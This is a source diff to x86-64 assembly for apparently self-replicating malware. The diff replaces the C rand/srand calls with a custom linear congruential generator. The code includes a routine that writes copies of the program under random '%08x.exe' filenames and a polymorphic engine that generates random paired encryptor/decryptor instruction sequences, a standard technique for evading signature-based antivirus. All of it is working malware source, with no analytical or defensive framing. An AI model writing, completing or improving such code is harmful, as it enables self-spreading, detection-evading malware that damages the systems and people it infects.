@@ -14,8 +14,6 @@ extern free
 extern sprintf
 extern memset
 extern memcpy
-extern rand
-extern srand
 
 %define NULL 0x00
 
@@ -86,6 +84,15 @@ extern srand
 %endmacro
 
 section .data
+	align 4
+	lcg_x: dd 0
+	align 4
+	rb_mode: db "rb", NULL
+	align 4
+	wb_mode: db "wb", NULL
+	align 4
+	file_format: db "%08x.exe", NULL
+
 	; the table of all the possible ModRegRM fields allowed
 	; Note that the instructions are not distructive (e.g. sub eax, eax)
 	;
@@ -110,12 +117,6 @@ section .data
 	; ebx  | edx
 	align 4
 	mod_reg_rm: db 0xC8, 0xD0, 0xD8, 0xC1, 0xD1, 0xD9, 0xC2, 0xCA, 0xDA, 0xC3, 0xCB, 0xD3
-	align 4
-	rb_mode: db "rb", NULL
-	align 4
-	wb_mode: db "wb", NULL
-	align 4
-	file_format: db "%08x.exe", NULL
 
 section .text
 
@@ -145,6 +146,32 @@ main:
 .epilogue:
 	mov     rsp, rbp
 	pop     rbp
+	ret
+
+; linear congruential generator set seed
+;
+; [in] ecx : seed
+;
+lcg_seed:
+	mov     [rel lcg_x], ecx
+	ret
+
+; linear congruential generator get random value
+;
+; https://en.wikipedia.org/wiki/Linear_congruential_generator
+; M = 2^31
+; A = 0x41C64E6D
+; C = 0x3039
+;
+; eax : 32-bit random value
+;
+lcg_rand32:
+	mov     ecx, 0x41C64E6D
+	mov     eax, [rel lcg_x]
+	mul     ecx
+	add     eax, 0x3039
+	and     eax, 0x7FFFFFFF
+	mov     [rel lcg_x], eax
 	ret
 
 ; decryption function
@@ -219,17 +246,13 @@ replicate:
 	mov     rbx, rax
 	; seed the random number generator
 	call    GetTickCount
-	mov     rcx, rax
-	call    srand
+	mov     ecx, eax
+	call    lcg_seed
 	; call the polymorphic engine
 	mov     rcx, rbx
 	call    polymorphic_engine
 	; generate filename of the copy
-	call    rand
-	mov     [rbp-0xA], ax
-	call    rand
-	shl     eax, 0x10
-	mov     ax, [rbp-0xA]
+	call    lcg_rand32
 	mov     r8d, eax
 	lea     rcx, [rbp-0x20]
 	lea     rdx, [rel file_format]
@@ -277,8 +300,8 @@ polymorphic_engine:
 	push    rbx
 	push    r12
 	push    r13
-	push    r14
 	mov     rbp, rsp
+	and     rsp, -0x10
 	sub     rsp, (0x20+(2*ENC_DEC_SIZE))
 	mov     [rbp+0x40], rcx
 	; initialize the encryptor and decryptor buffers
@@ -291,13 +314,13 @@ polymorphic_engine:
 	; generate the encryptor and the decryptor
 	lea     rbx, [rsi+ENC_DEC_SIZE-0x6]
 	lea     r12, [rel mod_reg_rm]
-	mov     r14d, 0xC
+	mov     r13d, 0xC
 .enc_dec_generation_loop:
 	cmp     rsi, rbx
 	ja      .enc_dec_generation_end
-	call    rand
+	call    lcg_rand32
 	xor     edx, edx
-	div     r14d
+	div     r13d
 	jmp     [.instructions_table+rdx*8]
 	align 8
 	; the instructions table
@@ -315,9 +338,9 @@ polymorphic_engine:
 	                     dq .neg_reg
 .add_reg_reg:
 	sub     rdi, 0x2
-	call    rand
+	call    lcg_rand32
 	xor     edx, edx
-	div     r14d
+	div     r13d
 	mov     al, [r12+rdx]
 	mov     dh, al
 	mov     ah, OPCODE_ADD_RM
@@ -329,9 +352,9 @@ polymorphic_engine:
 	jmp     .enc_dec_generation_loop
 .sub_reg_reg:
 	sub     rdi, 0x2
-	call    rand
+	call    lcg_rand32
 	xor     edx, edx
-	div     r14d
+	div     r13d
 	mov     al, [r12+rdx]
 	mov     dh, al
 	mov     ah, OPCODE_SUB_RM
@@ -343,9 +366,9 @@ polymorphic_engine:
 	jmp     .enc_dec_generation_loop
 .xor_reg_reg:
 	sub     rdi, 0x2
-	call    rand
+	call    lcg_rand32
 	xor     edx, edx
-	div     r14d
+	div     r13d
 	mov     al, [r12+rdx]
 	mov     ah, OPCODE_XOR_RM
 	xchg    al, ah
@@ -355,89 +378,84 @@ polymorphic_engine:
 	jmp     .enc_dec_generation_loop
 .add_reg_i32:
 	sub     rdi, 0x6
-	call    rand
-	mov     r13d, eax
-	call    rand
+	call    lcg_rand32
 	mov     al, PREFIX_ADD_SUB_XOR_RI
 	and     ah, 0x3
 	mov     dx, ax
 	or      ah, OPCODE_ADD_RI
 	or      dh, OPCODE_SUB_RI
-	mov     [rsi    ], ax
-	mov     [rsi+0x2], r13d
-	mov     [rdi    ], dx
-	mov     [rdi+0x2], r13d
+	mov     [rsi], ax
+	mov     [rdi], dx
+	call    lcg_rand32
+	mov     [rsi+0x2], eax
+	mov     [rdi+0x2], eax
 	add     rsi, 0x6
 	jmp     .enc_dec_generation_loop
 .sub_reg_i32:
 	sub     rdi, 0x6
-	call    rand
-	mov     r13d, eax
-	call    rand
+	call    lcg_rand32
 	mov     al, PREFIX_ADD_SUB_XOR_RI
 	and     ah, 0x3
 	mov     dx, ax
 	or      ah, OPCODE_SUB_RI
 	or      dh, OPCODE_ADD_RI
-	mov     [rsi    ], ax
-	mov     [rsi+0x2], r13d
-	mov     [rdi    ], dx
-	mov     [rdi+0x2], r13d
+	mov     [rsi], ax
+	mov     [rdi], dx
+	call    lcg_rand32
+	mov     [rsi+0x2], eax
+	mov     [rdi+0x2], eax
 	add     rsi, 0x6
 	jmp     .enc_dec_generation_loop
 .xor_reg_i32:
 	sub     rdi, 0x6
-	call    rand
-	mov     r13d, eax
-	call    rand
+	call    lcg_rand32
 	mov     al, PREFIX_ADD_SUB_XOR_RI
 	and     ah, 0x3
 	or      ah, OPCODE_XOR_RI
-	mov     [rsi    ], ax
-	mov     [rsi+0x2], r13d
-	mov     [rdi    ], ax
-	mov     [rdi+0x2], r13d
+	mov     [rsi], ax
+	mov     [rdi], ax
+	call    lcg_rand32
+	mov     [rsi+0x2], eax
+	mov     [rdi+0x2], eax
 	add     rsi, 0x6
 	jmp     .enc_dec_generation_loop
 .rol_reg_i8:
 	sub     rdi, 0x3
-	call    rand
-	and     eax, 0x1F
-	or      eax, 0x1
-	mov     r13d, eax
-	call    rand
+	call    lcg_rand32
 	mov     al, PREFIX_ROL_ROR_RI
 	and     ah, 0x3
 	mov     dx, ax
 	or      ah, OPCODE_ROL_RI
 	or      dh, OPCODE_ROR_RI
-	mov     [rsi    ], ax
-	mov     [rsi+0x2], r13b
-	mov     [rdi    ], dx
-	mov     [rdi+0x2], r13b
+	mov     [rsi], ax
+	mov     [rdi], dx
+	call    lcg_rand32
+	and     al, 0x1F
+	or      al, 0x1
+	mov     [rsi+0x2], al
+	mov     [rdi+0x2], al
 	add     rsi, 0x3
 	jmp     .enc_dec_generation_loop
 .ror_reg_i8:
 	sub     rdi, 0x3
-	call    rand
-	and     eax, 0x1F
-	or      eax, 0x1
-	mov     r13d, eax
-	call    rand
+	call    lcg_rand32
 	mov     al, PREFIX_ROL_ROR_RI
 	and     ah, 0x3
 	mov     dx, ax
 	or      ah, OPCODE_ROR_RI
 	or      dh, OPCODE_ROL_RI
-	mov     [rsi    ], ax
-	mov     [rsi+0x2], r13b
-	mov     [rdi    ], dx
-	mov     [rdi+0x2], r13b
+	mov     [rsi], ax
+	mov     [rdi], dx
+	call    lcg_rand32
+	and     al, 0x1F
+	or      al, 0x1
+	mov     [rsi+0x2], al
+	mov     [rdi+0x2], al
 	add     rsi, 0x3
 	jmp     .enc_dec_generation_loop
 .inc_reg:
 	sub     rdi, 0x2
-	call    rand
+	call    lcg_rand32
 	mov     al, PREFIX_INC_DEC_R
 	and     ah, 0x3
 	mov     dx, ax
@@ -449,7 +467,7 @@ polymorphic_engine:
 	jmp     .enc_dec_generation_loop
 .dec_reg:
 	sub     rdi, 0x2
-	call    rand
+	call    lcg_rand32
 	mov     al, PREFIX_INC_DEC_R
 	and     ah, 0x3
 	mov     dx, ax
@@ -461,7 +479,7 @@ polymorphic_engine:
 	jmp     .enc_dec_generation_loop
 .not_reg:
 	sub     rdi, 0x2
-	call    rand
+	call    lcg_rand32
 	mov     al, PREFIX_NOT_NEG_R
 	and     ah, 0x3
 	or      ah, OPCODE_NOT_R
@@ -471,7 +489,7 @@ polymorphic_engine:
 	jmp     .enc_dec_generation_loop
 .neg_reg:
 	sub     rdi, 0x2
-	call    rand
+	call    lcg_rand32
 	mov     al, PREFIX_NOT_NEG_R
 	and     ah, 0x3
 	or      ah, OPCODE_NOT_R
@@ -531,7 +549,6 @@ polymorphic_engine:
 	call    memcpy
 .epilogue:
 	mov     rsp, rbp
-	pop     r14
 	pop     r13
 	pop     r12
 	pop     rbx
